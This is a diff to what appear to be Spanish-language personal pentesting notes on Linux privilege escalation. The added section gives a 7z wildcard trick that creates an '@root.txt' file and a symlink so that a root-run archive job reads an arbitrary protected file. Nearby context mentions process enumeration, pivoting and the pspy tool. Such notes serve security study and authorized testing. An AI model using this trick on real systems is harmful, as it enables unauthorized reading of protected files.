@@ -63,6 +63,13 @@ ps -faux | grep <puerto encontrado en netstat>
 #Tambien, dependiendo el caso, se podria hacer pivoting. Ver txt sobre el tema
 
 ----------      ----------      ----------      ----------
+	### Wildcards
+cd /path/to/7z/acting/folder
+touch @root.txt
+ln -s /file/you/want/to/read root.txt
+referencias: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----f1c2793eeb7e--------------------------------
+
+----------      ----------      ----------      ----------
         ### Croonjobs
 pspy (https://github.com/DominicBreuker/pspy)
 #Es un tool que permite ver las tareas que se ejecutan en un sistema en X tiempo.
